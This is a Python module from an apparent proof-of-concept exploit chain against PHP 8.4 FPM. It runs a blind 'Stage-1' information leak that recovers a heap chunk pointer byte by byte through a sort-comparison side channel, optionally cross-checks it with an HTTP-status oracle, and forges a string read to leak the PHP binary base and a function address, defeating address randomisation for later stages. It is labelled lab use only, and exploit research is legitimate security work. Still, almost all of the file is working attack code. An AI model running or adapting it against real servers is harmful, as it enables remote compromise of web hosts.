#!/usr/bin/env python3
# INDEX: stage-1 chunk+binbase leak via sort sink | fpm | pure | other(comparison sink) | build
"""Shared no-echo Stage-1 leak for the comparison-sink chains: the SORT-sink
chunk recovery, the optional ORDERED-gate cross-agree, the forged IS_STRING
binbase read, and the build fingerprint (&zval_ptr_dtor). Orchestration glue --
it composes the sink primitives (SinkAdapter catalog, recover_field/bisect_bytes,
exfil_chunk_pointer/exfil_binbase, the payload builders) from
primitives/oracles/sideeffect_exfil_apps.py, imported read-only. Pure stdlib,
safe under python3 -I. Lab/analysis use only.
"""
from __future__ import annotations

import importlib.util
import os
import sys

_POC = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_POC)  # poc/


def _load(fname):
    path = os.path.join(_POC, fname)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, fname)
    spec = importlib.util.spec_from_file_location(fname[:-3], path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_POC, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(mod)
    return mod


# The sink primitives live in sideeffect_exfil_apps; bind the exact names the
# shared stage references.
_X = _load("primitives/oracles/sideeffect_exfil_apps.py")

build_leak_payload = _X.build_leak_payload
warmup = _X.warmup
bisect_bytes = _X.bisect_bytes
exfil_chunk_pointer = _X.exfil_chunk_pointer
exfil_binbase = _X.exfil_binbase
VOFF = _X.VOFF
PTR_BYTES = _X.PTR_BYTES
OBJ_OFF_SORT = _X.OBJ_OFF_SORT


# Shared Stage-1: no-echo exfil of both pointers over the comparison sink
def sinkexfil_stage1(sort, gate=None, log=print, exfil_log=None):
    """Run the shared no-echo Stage-1 leak over a SORT comparison sink and return
    (chunk, binbase, dtor, detail).

    sort      : a detected OrderAdapter (klass 'sort'); carries both pointers.
    gate      : an optional GateAdapter (klass 'ordered'); when given, the chunk
                is independently re-recovered over its HTTP-status channel and
                cross-agreed against the sort channel (detail['chunk_agree']).
    log       : narration channel for the stage lines (cross-agree / no-gate /
                OBJ_OFF_SORT).
    exfil_log : inner-op channel handed to exfil_chunk_pointer / exfil_binbase;
                defaults to `log`. Pass a silent sink to keep the byte-by-byte
                recovery quiet while still narrating the stage.

    binbase is None when the forged read is not 2MB-aligned (OBJ_OFF_SORT needs
    re-calibration for this build/shape). detail carries chunk_agree, dtor,
    obj_off_sort, and the raw recovered byte strings (rec_sort, bb_bytes)."""
    if exfil_log is None:
        exfil_log = log

    # --- chunk via the SORT sink (1 byte/request) ---
    rec_sort, chunk = exfil_chunk_pointer(sort, log=exfil_log)

    # --- cross-agree the chunk via the ORDERED gate's status (independent) ---
    agree = None
    if gate is not None:
        payload, spray = build_leak_payload()
        warmup(gate, payload)
        gate.set_payload(payload)
        rec_gate = bisect_bytes(gate.hit, spray, VOFF, PTR_BYTES)
        agree = (rec_gate == rec_sort)
        log(f"[stage1] chunk cross-agree (sort vs ordered gate): {agree} "
            f"(0x{rec_gate.hex()})")
    else:
        log("[stage1] (no ordered gate detected; chunk from the sort channel only)")

    # --- binbase via the SORT sink (forged read, shape-recalibrated OBJ offset) ---
    log(f"[stage1] OBJ_OFF_SORT = {OBJ_OFF_SORT:#x}  "
        f"(sort shape: field+256 cand[]; re-derived for this 8.4.26-fpm build)")
    binbase, dtor, bb_bytes = exfil_binbase(sort, chunk, OBJ_OFF_SORT, log=exfil_log)

    detail = {"chunk_agree": agree, "dtor": dtor, "obj_off_sort": OBJ_OFF_SORT,
              "rec_sort": rec_sort, "bb_bytes": bb_bytes}
    return chunk, binbase, dtor, detail
